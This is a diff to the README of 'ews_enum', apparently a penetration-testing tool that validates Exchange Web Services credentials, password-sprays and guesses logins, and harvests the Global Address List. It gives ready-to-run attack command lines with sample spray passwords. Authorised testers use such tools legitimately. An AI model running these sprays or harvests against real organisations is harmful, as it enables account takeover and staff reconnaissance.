@@ -1,115 +1,80 @@
 # ews_enum
 
-Exchange Web Services (EWS) tool for credential validation, GAL enumeration, password spraying, and credential guessing.
+`ews_enum` validates EWS credentials, sprays a password across users, tests `username:password` pairs, and can enumerate the GAL with `ResolveNames`.
 
-Authenticates against an EWS endpoint using NTLM or Basic auth and can enumerate the Global Address List (GAL) via the `ResolveNames` SOAP operation.
+Default mode is a single credential check.
 
 ## Build
 
 ```bash
-go build -o ews_enum ./cmd/ews_enum/
+go build -o ews_enum ./cmd/ews_enum
 ```
 
 ## Modes
 
-### Credential Check
-
-Test a single set of credentials:
+### 1. Credential Check
 
 ```bash
 ews_enum -url https://mail.target.com/EWS/Exchange.asmx -user 'DOMAIN\user' -pass 'P@ssword'
 ```
 
-### GAL Enumeration
+Checks whether the credentials are valid. This is the default behavior.
 
-Authenticate and enumerate the Global Address List:
+### 2. Password Spray
+
+```bash
+ews_enum -url https://mail.target.com/EWS/Exchange.asmx -userfile users.txt -pass 'Winter2026!' -o hits.csv
+```
+
+- `users.txt` is one username per line
+- blank lines and `#` comments are ignored
+- duplicate usernames are attempted once
+- skipped duplicate usernames are printed after the run
+
+### 3. Credential Guessing
+
+```bash
+ews_enum -url https://mail.target.com/EWS/Exchange.asmx -credfile guesses.txt -format json -o hits.json
+```
+
+- `guesses.txt` is one `username:password` pair per line
+- the line is split on the first `:`
+- the username is trimmed
+- the rest of the line is kept as the password verbatim
+- `username:` means empty password
+- if a username appears more than once, only the first pair is attempted
+- skipped `username:password` combinations are printed after the run
+
+### 4. GAL Enumeration
 
 ```bash
 ews_enum -url https://mail.target.com/EWS/Exchange.asmx -user 'DOMAIN\user' -pass 'P@ssword' -enum
 ```
 
-Enumeration works by calling `ResolveNames` with short prefixes (a-z, 0-9). If a prefix returns 100+ results (the EWS truncation limit), it recurses deeper (e.g., `a` → `aa`, `ab`, ...) up to `-depth` characters.
+Enumeration uses `ResolveNames` over `a-z0-9` prefixes and recurses deeper when Exchange truncates results. Output is streamed to `stderr` as contacts are found, then written in sorted form to `stdout` or `-o`.
 
-Results stream to stderr as they're found. Final sorted output goes to stdout (or a file with `-o`).
+## Common Flags
 
-### Password Spraying
+| Flag | Meaning |
+|------|---------|
+| `-url` | EWS endpoint URL |
+| `-user` | Single username |
+| `-userfile` | Username list for spray mode |
+| `-credfile` | `username:password` list for guess mode |
+| `-pass` | Password for auth-check, spray, or enum |
+| `-enum` | Enable GAL enumeration |
+| `-format` | Spray/guess: `csv` or `json`. Enum: `csv`, `json`, or `emails` |
+| `-o` | Write results to a file |
+| `-ntlm=false` | Use Basic auth instead of NTLM |
+| `-timeout` | HTTP timeout in seconds |
+| `-workers` | Number of workers |
+| `-conns` | Max in-flight requests |
+| `-delay` | Minimum delay between request starts, shared across workers |
+| `-depth` | Max enum prefix depth |
 
-Spray a single password against a list of users:
+## Notes
 
-```bash
-ews_enum -url https://mail.target.com/EWS/Exchange.asmx -userfile users.txt -pass 'P@ssword' -o hits.csv
-```
-
-The user file should contain one username per line. Blank lines and `#` comments are skipped. If duplicate usernames are present, only the first attempt is used and a unique list of skipped duplicate usernames is printed after the run completes.
-
-### Credential Guessing
-
-Try a file of `username:password` guesses, attempting only the first credential seen for each username:
-
-```bash
-ews_enum -url https://mail.target.com/EWS/Exchange.asmx -credfile guesses.txt -o hits.json -format json
-```
-
-The credential file should contain one `username:password` pair per line. Blank lines and `#` comments are skipped. The parser splits on the first `:` only, trims the username, and preserves the rest of the line as the password verbatim, including additional `:` characters or surrounding spaces. An empty password is represented as `username:`. If the same username appears multiple times, only the first pair is attempted, and after the run completes the tool prints the unique `username:password` combinations that were not attempted.
-
-## Flags
-
-| Flag | Default | Description |
-|------|---------|-------------|
-| `-url` | | EWS endpoint URL (required) |
-| `-user` | | Single username (DOMAIN\user or user@domain.com) |
-| `-userfile` | | File of usernames for spraying (one per line) |
-| `-credfile` | | File of `username:password` guesses (one per line, first username wins) |
-| `-pass` | | Password (required unless using `-credfile`) |
-| `-enum` | `false` | Enumerate the GAL after authenticating |
-| `-debug-dupes` | `false` | Deprecated and ignored; duplicate summaries are always printed |
-| `-format` | `csv` | Spray/guess: `csv` or `json`. Enum: `csv`, `json`, or `emails` |
-| `-o` | stdout | Output file path |
-| `-ntlm` | `true` | Use NTLM auth (`false` for Basic) |
-| `-timeout` | `30` | HTTP timeout in seconds |
-| `-depth` | `3` | Max prefix depth for enumeration |
-| `-delay` | `0` | Minimum delay between request starts in milliseconds, shared across workers |
-| `-workers` | `10` | Number of concurrent workers |
-| `-conns` | `20` | Max concurrent connections to the server |
-
-## Examples
-
-```bash
-# Check creds with Basic auth
-ews_enum -url https://10.0.0.1/EWS/Exchange.asmx -user 'user@corp.com' -pass 'P@ss' -ntlm=false
-
-# Enumerate GAL, save as JSON
-ews_enum -url https://mail.corp.com/EWS/Exchange.asmx -user 'CORP\admin' -pass 'P@ss' -enum -format json -o gal.json
-
-# Enumerate GAL, emails only
-ews_enum -url https://mail.corp.com/EWS/Exchange.asmx -user 'CORP\admin' -pass 'P@ss' -enum -format emails -o emails.txt
-
-# Spray with 5 workers and 1s minimum delay between request starts
-ews_enum -url https://mail.corp.com/EWS/Exchange.asmx -userfile users.txt -pass 'Summer2026!' -workers 5 -delay 1000
-
-# Guess from a username:password file; later duplicate usernames are logged and skipped
-ews_enum -url https://mail.corp.com/EWS/Exchange.asmx -credfile guesses.txt -format json -o guess_hits.json
-
-# Fast enumeration with more workers
-ews_enum -url https://mail.corp.com/EWS/Exchange.asmx -user 'CORP\svc' -pass 'P@ss' -enum -workers 20 -conns 30
-```
-
-## Output Formats
-
-**Enumeration CSV** (default):
-```
-email,display_name,given_name,surname,title,department,office,company,phone
-jsmith@corp.com,John Smith,John,Smith,IT Manager,Information Technology,HQ,Corp Inc,555-1234
-```
-
-**Credential CSV** (spray or guess):
-```
-username,password,status
-CORP\jsmith,P@ssword,valid
-```
-
-**Emails** (`-format emails`): one email address per line.
-
-**JSON** (`-format json`): array of contact or credential result objects.
-
-`-format` and `-o` are only used by spray, guess, and enum modes. Auth-check mode prints status to stderr and ignores them.
+- Auth-check ignores `-format` and `-o`.
+- `-depth` only matters with `-enum`.
+- `-debug-dupes` is deprecated and ignored.
+- Output files are created with restrictive permissions.
